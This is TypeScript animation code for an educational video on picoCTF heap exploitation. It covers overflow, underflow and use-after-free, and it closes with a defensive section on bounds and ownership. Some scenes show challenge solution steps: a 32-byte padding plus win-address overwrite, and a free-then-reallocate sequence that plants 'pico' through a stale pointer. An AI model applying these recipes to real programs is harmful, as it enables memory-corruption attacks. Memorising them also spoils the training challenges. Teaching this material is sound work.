    <Line ref={stackArrow} points={[[-480,260],[-480,-108]]} stroke={C.coral} lineWidth={6} endArrow arrowSize={20} end={0} />
    <Label text="HEAP" x={470} y={-335} width={600} tone="mint" size={30} align="center" />
    {['input_data','safe_var','size','callback','vtable'].map((label,index)=><Rect key={`heap-label-${index}-${label}`} x={-320+index*195} y={0} width={175} height={190} radius={15} fill={C.panel} stroke={index===4?C.amber:C.rule} lineWidth={2}><Label text={label} y={0} width={160} tone={index===4?'amber':'ink'} size={index===0?19:20} align="center" /></Rect>)}
    <Line ref={heapArrow} points={[[-320,0],[430,0]]} stroke={C.coral} lineWidth={6} endArrow arrowSize={20} end={0} />
  </Node>);
  comparison().opacity(0); yield* comparison().opacity(1,0.65);
  yield* stackArrow().end(1,1.1); yield* heapArrow().end(1,1.1);
  caption('Heap targets depend on their neighbor.');
  yield* waitFor(61.1);
  yield* fadeOut(comparison(), camera());

  // 12:20–13:30 · underflow visual model
  chapter('12:20 · HEAP UNDERFLOW');
  caption('Conceptual reconstruction: write left.');
  const under = createRef<Node>();
  const negative = createRef<Rect>();
  const leftArrow = createRef<Line>();
  camera().add(<Node ref={under}>
    <Chip text="ANIMATION-ONLY RECONSTRUCTION · not picoCTF runtime output" y={-370} width={980} tone="amber" />
    <Rect x={-520} y={-10} width={420} height={270} radius={20} fill={C.panel} stroke={C.muted} lineWidth={2}><Label text="previous object" y={-92} width={360} tone="muted" size={26} align="center" /><Label text="tail bytes · metadata" y={15} width={360} tone="muted" size={22} align="center" /></Rect>
    <Rect x={20} y={-10} width={480} height={270} radius={20} fill={C.panel} stroke={C.mint} lineWidth={3}><Label text="x valid region" y={-92} width={410} tone="mint" size={28} align="center" /><Label text="index 0 begins here" y={15} width={410} tone="ink" size={22} align="center" /></Rect>
    <Rect ref={negative} x={195} y={50} width={84} height={64} radius={10} fill={C.coral}><Label text="-1" y={0} width={76} tone="ink" size={26} align="center" /></Rect>
    <Line ref={leftArrow} points={[[195,50],[-520,50]]} stroke={C.coral} lineWidth={6} endArrow arrowSize={20} end={0} />
    <SourcePanel y={330} width={1120} height={220} title="pseudo-source" breadcrumb="conceptual only" rows={codeRows(1, ['char *x = malloc(32);', 'x[index] = value;   // index accidentally negative'])} />
  </Node>);
  under().opacity(0); yield* under().opacity(1,0.65);
  yield* negative().position.x(60,0.8); yield* leftArrow().end(1,1.35);
  caption('Move the write address before the base.');
  yield* waitFor(66.0);
  yield* fadeOut(under(), camera());

  // 13:30–14:38 · underflow causes
  chapter('13:30 · HOW WRITES GO LEFT');
  caption('Three bugs break the lower bound.');
  const causes = createRef<Node>();
  const causeCards: Rect[] = [];
  camera().add(<Node ref={causes}>
    {[
      ['1. negative index', 'arr[-1] → base − sizeof(element)'],
      ['2. pointer moved before base', 'p--;  *p = X'],
      ['3. trusted parser offset', 'offset = -8 → write before object'],
    ].map((item,index)=><Rect key={`cause-card-${index}-${item[0]}`} ref={node=>causeCards[index]=node} x={-610+index*610} y={-30} width={540} height={355} radius={20} fill={C.panel} stroke={C.rule} lineWidth={2}>
      <Label text={item[0]} x={-220} y={-118} width={450} tone="amber" size={23} />
      <Label text={item[1]} x={-220} y={-20} width={450} tone="ink" size={22} />
      <Line points={[[-160,105],[-210,105]]} stroke={C.coral} lineWidth={5} endArrow arrowSize={17} />
      <Label text="bytes light up before base" x={-220} y={132} width={450} tone="coral" size={18} />
    </Rect>)}
    <Rect y={365} width={1370} height={104} radius={18} fill={C.raised} stroke={C.coral} lineWidth={3}><Label text="base ≤ write_address < base + allocation_size" y={0} width={1300} tone="ink" size={33} align="center" /></Rect>
  </Node>);
  causes().opacity(0); causes().scale(0.92); yield* all(causes().opacity(1,0.65),causes().scale(1,0.65));
  for (let index=0; index<3; index++) { yield* all(causeCards[index].stroke(C.coral,0.7),causeCards[index].scale(1.04,0.7)); yield* causeCards[index].scale(1,0.45); yield* waitFor(8.3); }
  caption('Prove the lower bound too.');
  yield* waitFor(39.1);
  yield* fadeOut(causes(), camera());

  // 14:38–15:55 · metadata responsibly
  chapter('14:38 · WHAT THE ALLOCATOR TRUSTS');
  caption('Not a full allocator attack.');
  const metadata = createRef<Node>();
  const crash = createRef<Rect>();
  const control = createRef<Rect>();
  camera().add(<Node ref={metadata}>
    <Label text="allocator bookkeeping · abstracted" y={-350} width={1000} tone="muted" size={22} align="center" />
    <Rect y={-150} width={1360} height={190} radius={20} fill={C.panel} stroke={C.rule} lineWidth={2}><Label text="prev_size   |   size + flags   |   freelist pointer   |   user data" y={-20} width={1260} tone="muted" size={27} align="center" /><Label text="overflow / underflow may touch future trusted state" y={62} width={1260} tone="coral" size={22} align="center" /></Rect>
    <Rect ref={crash} x={-380} y={170} width={560} height={230} radius={18} fill={C.panel} stroke={C.coral} lineWidth={3}><Label text="branch A" x={-220} y={-72} width={430} tone="coral" size={20} /><Label text="malloc(): corrupted\nchunk state → crash" y={20} width={480} tone="coral" size={26} align="center" /></Rect>
    <Rect ref={control} x={380} y={170} width={560} height={230} radius={18} fill={C.panel} stroke={C.mint} lineWidth={3}><Label text="branch B" x={-220} y={-72} width={430} tone="mint" size={20} /><Label text="neighbor field changes\nprogram trusts it later" y={20} width={480} tone="mint" size={26} align="center" /></Rect>
    <Line points={[[-200,-55],[-380,55]]} stroke={C.coral} lineWidth={4} endArrow arrowSize={16} />
    <Line points={[[200,-55],[380,55]]} stroke={C.mint} lineWidth={4} endArrow arrowSize={16} />
  </Node>);
  metadata().opacity(0); yield* metadata().opacity(1,0.65);
  yield* all(crash().scale(1.04,0.9),control().scale(1.04,0.9));
  yield* all(crash().opacity(0.25,1),control().scale(1.12,1));
  caption('Data/control flow, not allocator abuse.');
  yield* waitFor(71.2);
  yield* fadeOut(metadata(), camera());

  // 15:55–17:10 · forensic recap
  chapter('15:55 · WHAT EXACTLY WAS EXPLOITED?');
  caption('Bug → evidence → strategy → consequence.');
  const forensic = createRef<Node>();
  const columns: Rect[] = [];
  camera().add(<Node ref={forensic}>
    {[
      ['BUG', 'scanf("%s")\nwrite_buffer()'],
      ['EVIDENCE', 'heap print\n0x20 observed'],
      ['STRATEGY', 'A × 32\n+ p64(win)'],
      ['RESULT', 'check_win\n→ win'],
    ].map((item,index)=><Rect key={`forensic-col-${index}-${item[0]}`} ref={node=>columns[index]=node} x={-650+index*430} y={-20} width={370} height={410} radius={20} fill={C.panel} stroke={index===0?C.coral:index===3?C.mint:C.amber} lineWidth={3}>
      <Label text={item[0]} x={-145} y={-155} width={290} tone={index===0?'coral':index===3?'mint':'amber'} size={22} />
      <Label text={item[1]} y={25} width={310} tone="ink" size={28} align="center" />
    </Rect>)}
    {Array.from({length:3},(_,index)=><Line key={`forensic-link-${index}`} points={[[-465+index*430,-20],[-405+index*430,-20]]} stroke={C.secondary} lineWidth={4} endArrow arrowSize={16} end={0} />)}
    <Label text="source → measurement → payload → consequence" y={360} width={1450} tone="secondary" size={32} align="center" />
  </Node>);
  forensic().opacity(0); yield* forensic().opacity(1,0.65);
  yield* cascadeIn(columns,0.18,0.55);
  caption('malloc placed them. Input crossed.');
  yield* cameraTravel(camera(),'push',1.2);
  yield* waitFor(72.9);
  yield* fadeOut(forensic(), camera());

  // 17:10–18:40 · UAF transition
  chapter('17:10 · UAF — THE GHOST NEIGHBOR');
  caption('A dangling pointer keeps its key.');
  const uaf = createRef<Node>();
  const uafActive = createSignal(-1);
  const objectRoom = createRef<Rect>();
  const key = createRef<Rect>();
  const conveyor = createRef<Line>();
  camera().add(<Node ref={uaf}>
    <SourcePanel x={-410} y={-35} width={860} height={680} title="heap3-chall.c" breadcrumb="complete source → UAF focus" active={() => uafActive()} rows={codeRows(7, [
      'typedef struct {', '  char a[10]; char b[10];', '  char c[10]; char flag[5];', '} object;', '', 'object *x;', '', 'x = malloc(sizeof(object));', 'strncpy(x->flag, "bico", 5);', '', 'void free_memory() { free(x); }', 'void check_win() { strcmp(x->flag, "pico"); }',
    ])} />
    <Rect ref={objectRoom} x={500} y={-105} width={730} height={230} radius={18} fill={C.panel} stroke={C.mint} lineWidth={3}>
      <Label text="object x" x={-320} y={-78} width={400} tone="mint" size={25} />
      {['a[10]','b[10]','c[10]','flag[5]'].map((field,index)=><Rect key={`uaf-field-${index}-${field}`} x={-250+index*165} y={28} width={150} height={74} radius={8} fill={C.raised} stroke={index===3?C.amber:C.rule} lineWidth={2}><Label text={field} y={0} width={138} tone={index===3?'amber':'ink'} size={20} align="center" /></Rect>)}
    </Rect>
    <Rect ref={key} x={785} y={155} width={150} height={70} radius={12} fill={C.raised} stroke={C.amber} lineWidth={2}><Label text="x key" y={0} width={130} tone="amber" size={20} align="center" /></Rect>
    <Line ref={conveyor} points={[[180,270],[775,270]]} stroke={C.mint} lineWidth={6} endArrow arrowSize={20} end={0} />
    <Label text="free(x) → room enters the allocator's reuse path" x={180} y={340} width={1150} tone="muted" size={22} align="center" />
  </Node>);
  uaf().opacity(0); yield* uaf().opacity(1,0.65);
  for (const index of [0,1,2,3,5,7,8,10,11]) {uafActive(index); yield* waitFor(3.4);}
  yield* all(objectRoom().opacity(0.25,0.9),key().position.y(90,0.9),conveyor().end(1,1));
  caption('free ends ownership; x still exists.');
  yield* waitFor(56.5);
  yield* fadeOut(uaf(), camera());

  // 18:40–20:05 · UAF mechanics
  chapter('18:40 · REUSE THE SAME CHUNK');
  caption('Same-size malloc can recycle the room.');
  const reuse = createRef<Node>();
  const oldRoom = createRef<Rect>();
  const newRoom = createRef<Rect>();
  const stale = createRef<Line>();
  camera().add(<Node ref={reuse}>
    <Chip text="5 → Free x" x={-610} y={-335} width={240} tone="coral" />
    <Chip text="2 → Allocate object" x={-300} y={-335} width={330} tone="mint" />
    <Chip text="35 → sizeof(object)" x={90} y={-335} width={330} tone="amber" />
    <Chip text="A × 30 + pico" x={480} y={-335} width={290} tone="mint" />
    <Rect ref={oldRoom} x={-380} y={-30} width={680} height={270} radius={20} fill={C.panel} stroke={C.muted} lineWidth={3}><Label text="before free: x object" y={-90} width={610} tone="muted" size={28} align="center" /><Label text="a[10]  b[10]  c[10]  flag = bico" y={15} width={610} tone="muted" size={24} align="center" /></Rect>
    <Rect ref={newRoom} x={420} y={-30} width={680} height={270} radius={20} fill={C.panel} stroke={C.mint} lineWidth={3} opacity={0}><Label text="after malloc: user allocation" y={-90} width={610} tone="mint" size={28} align="center" /><Label text="A × 30  +  pico" y={15} width={610} tone="mint" size={30} align="center" /></Rect>
    <Line ref={stale} points={[[0,120],[420,120]]} stroke={C.amber} lineWidth={6} endArrow arrowSize={20} end={0} />
    <Label text="old pointer x follows the address, not the ownership" y={350} width={1400} tone="amber" size={29} align="center" />
  </Node>);
  reuse().opacity(0); yield* reuse().opacity(1,0.65);
  yield* all(oldRoom().opacity(0.28,1),newRoom().opacity(1,1),newRoom().position.x(-380,1,easeInOutCubic),oldRoom().position.x(420,1,easeInOutCubic));
  yield* stale().end(1,1);
  caption('check_win follows x into recycled memory.');
  yield* waitFor(80.15);
  yield* fadeOut(reuse(), camera());

  // 20:05–21:20 · mental model
  chapter('20:05 · FOUR-QUESTION COMPASS');
  caption('Ask these four questions every time.');
  const compass = createRef<Node>();
  const compassCards: Rect[] = [];
  const center = createRef<Rect>();
  camera().add(<Node ref={compass}>
    <Rect ref={center} width={270} height={270} radius={135} fill={C.raised} stroke={C.mint} lineWidth={4}><Label text="HEAP\nREADING" y={0} width={220} tone="mint" size={33} align="center" /></Rect>
    {[
      ['START','input_data'], ['BOUND','none'], ['NEIGHBOR','x / safe_var'], ['LATER USE','strcmp / call'],
    ].map((item,index)=> <Rect key={`compass-card-${item[0]}`} ref={node=>compassCards[index]=node} x={index===0?-500:index===1?500:index===2?-500:500} y={index<2?-190:190} width={380} height={132} radius={18} fill={C.panel} stroke={index===1?C.coral:C.amber} lineWidth={3}>
      <Label text={item[0]} x={-150} y={-34} width={280} tone={index===1?'coral':'amber'} size={21} />
      <Label text={item[1]} x={-150} y={26} width={290} tone="ink" size={24} />
    </Rect>)}
    {Array.from({length:4},(_,index)=><Line key={`compass-link-${index}`} points={[[index<2?index===0?-310:310:index===2?-310:310,index<2?-120:120],[index<2?index===0?-100:100:index===2?-100:100,index<2?-60:60]]} stroke={C.secondary} lineWidth={4} endArrow arrowSize={16} end={0} />)}
    <Label text="heap 1: strcmp · heap 2: function call · heap 3: stale pointer" y={395} width={1540} tone="secondary" size={27} align="center" />
  </Node>);
  compass().opacity(0); compass().scale(0.9); yield* all(compass().opacity(1,0.65),compass().scale(1,0.65));
  yield* cascadeIn(compassCards,0.15,0.5);
  yield* all(center().scale(1.12,0.8),center().rotation(360,0.8));
  caption('START · BOUND · NEIGHBOR · LATER USE.');
  yield* waitFor(68.6);
  yield* fadeOut(compass(), camera());

  // 21:20–22:25 · defensive view
  chapter('21:20 · DEFENSIVE LENS');
  caption('Safety requires bounds and ownership.');
  const defend = createRef<Node>();
  const unsafe = createRef<Rect>();
  const shield = createRef<Rect>();
  camera().add(<Node ref={defend}>
    <SourcePanel x={-380} y={-50} width={830} height={590} title="unsafe pattern" breadcrumb="principle, not a fake patch" rows={codeRows(1, [
      'scanf("%s", input_data);', '', 'x[index] = value;', '', 'free(x);', '… later: x->flag …',
    ])} />
    <Rect ref={unsafe} x={-380} y={-155} width={720} height={55} radius={8} fill={'#6D2924'} stroke={C.coral} lineWidth={2} />
    <Rect x={490} y={-65} width={600} height={470} radius={24} fill={C.panel} stroke={C.mint} lineWidth={3}>
      <Label text="defensive proof" x={-250} y={-170} width={480} tone="mint" size={25} />
      {['bounded input','index ≥ 0','index < size','clear ownership','ASan during testing'].map((text,index)=><Chip key={`defense-chip-${index}`} x={0} y={-90+index*74} width={470} tone={index===4?'amber':'mint'} text={text} />)}
    </Rect>
    <Rect ref={shield} x={490} y={315} width={160} height={110} radius={22} fill={C.raised} stroke={C.mint} lineWidth={4}><Txt text="⌂" fill={C.mint} fontFamily={MONO} fontSize={48} fontWeight={800} /></Rect>
  </Node>);
  defend().opacity(0); yield* defend().opacity(1,0.65);
  yield* unsafe().opacity(1,0.7); yield* shield().scale(1.16,0.8); yield* shield().scale(1,0.55);
  caption('Check below zero and past the end.');
  yield* waitFor(59.3);
  yield* fadeOut(defend(), camera());

  // 22:25–23:18 · recap
  chapter('22:25 · THREE MOTIONS, ONE TRUTH');
  caption('Overflow right. Underflow left. UAF reuses.');
  const recap = createRef<Node>();
  const right = createRef<Line>();
  const left = createRef<Line>();
  const loop = createRef<Line>();
  camera().add(<Node ref={recap}>
    <Rect x={-520} y={0} width={430} height={250} radius={20} fill={C.panel} stroke={C.muted} lineWidth={2}><Label text="previous object" y={-75} width={350} tone="muted" size={25} align="center" /></Rect>
    <Rect x={0} y={0} width={430} height={250} radius={20} fill={C.panel} stroke={C.mint} lineWidth={3}><Label text="current object" y={-75} width={350} tone="mint" size={25} align="center" /></Rect>
    <Rect x={520} y={0} width={430} height={250} radius={20} fill={C.panel} stroke={C.muted} lineWidth={2}><Label text="next object" y={-75} width={350} tone="muted" size={25} align="center" /></Rect>
    <Line ref={left} points={[[0,50],[-520,50]]} stroke={C.coral} lineWidth={7} endArrow arrowSize={22} end={0} />
    <Line ref={right} points={[[0,-50],[520,-50]]} stroke={C.coral} lineWidth={7} endArrow arrowSize={22} end={0} />
    <Line ref={loop} points={[[0,135],[0,270],[260,270],[260,135]]} stroke={C.amber} lineWidth={6} endArrow arrowSize={20} end={0} />
    <Label text="underflow" x={-265} y={-130} width={220} tone="coral" size={21} align="center" />
    <Label text="overflow" x={265} y={-130} width={220} tone="coral" size={21} align="center" />
    <Label text="use-after-free = old pointer, new tenant" y={370} width={1100} tone="amber" size={31} align="center" />
  </Node>);
  recap().opacity(0); yield* recap().opacity(1,0.65);
  yield* all(left().end(1,1),right().end(1,1));
  yield* loop().end(1,1.15);
  caption('Bounds only matter when checked.');
  yield* waitFor(48.2);
  yield* fadeOut(recap(), camera());

  // 23:18–23:45 · outro
  chapter('23:18 · OUTRO');
  caption('Next: follow freed-chunk footprints.');
  const outro = createRef<Node>();
  const cursor = createRef<Rect>();
  const input = createRef<Txt>();
  const leftRoom = createRef<Rect>();
  const rightRoom = createRef<Rect>();
  camera().add(<Node ref={outro}>
    <Terminal y={-45} width={1300} height={500} title="terminal" context="final frame" lines={[]} />
    <Label text="$" x={-565} y={-50} width={40} tone="mint" size={34} />
    <Txt ref={input} text="" x={-510} y={-50} width={900} offsetX={-1} fill={C.ink} fontFamily={MONO} fontSize={44} fontWeight={700} />
    <Rect ref={cursor} x={-500} y={-49} width={16} height={48} fill={C.mint} />
    <Rect ref={leftRoom} x={-200} y={320} width={250} height={110} radius={16} fill={C.panel} stroke={C.mint} lineWidth={3}><Label text="input_data" y={0} width={220} tone="mint" size={22} align="center" /></Rect>
    <Rect ref={rightRoom} x={200} y={320} width={250} height={110} radius={16} fill={C.panel} stroke={C.amber} lineWidth={3}><Label text="x" y={0} width={220} tone="amber" size={26} align="center" /></Rect>
  </Node>);
  // The final held frame must remain inspectable when seeking directly in the
  // standalone player, so the terminal enters as a complete composition.
  // (Earlier versions faded this container from zero, which could be skipped
  // during a direct late-timeline seek.)
  const text = 'watch the addresses.';
  for (let index = 1; index <= text.length; index++) { input().text(text.slice(0,index)); cursor().position.x(-500 + index * 25,0.06); yield* waitFor(0.06); }
  caption('watch the addresses.');
  yield* all(leftRoom().opacity(1,0.7),rightRoom().opacity(1,0.7));
  yield* waitFor(23.9);
  yield* waitFor(0.7);
});
